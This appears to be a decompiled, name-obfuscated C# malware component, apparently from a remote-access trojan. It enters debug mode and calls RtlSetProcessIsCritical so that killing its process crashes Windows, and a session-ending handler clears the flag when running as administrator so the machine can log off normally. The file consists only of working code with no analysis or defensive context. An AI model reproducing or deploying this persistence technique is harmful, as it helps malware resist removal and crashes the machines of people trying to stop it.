using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using Microsoft.Win32;

namespace JcxFVLIspytryi;

public static class hHLZIxfuPcla
{
	public static bool ZAjRHDAEhfjBK()
	{
		return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
	}

	public static void LfvmtzKBtikc(object sender, SessionEndingEventArgs e)
	{
		if (ZAjRHDAEhfjBK())
		{
			NwQFytnCgBs();
		}
	}

	public static void iAlJUYAbMpGbG()
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_0012: Expected O, but got Unknown
		try
		{
			SystemEvents.add_SessionEnding(new SessionEndingEventHandler(LfvmtzKBtikc));
			Process.EnterDebugMode();
			RtlSetProcessIsCritical(1u, 0u, 0u);
		}
		catch
		{
		}
	}

	public static void NwQFytnCgBs()
	{
		try
		{
			RtlSetProcessIsCritical(0u, 0u, 0u);
		}
		catch
		{
			while (true)
			{
				Thread.Sleep(100000);
			}
		}
	}

	[DllImport("ntdll.dll", SetLastError = true)]
	private static extern void RtlSetProcessIsCritical(uint KAZGaykgzRPm, uint mLIAsPBuSLUk, uint KRoyoJVgmCYpLop);
}
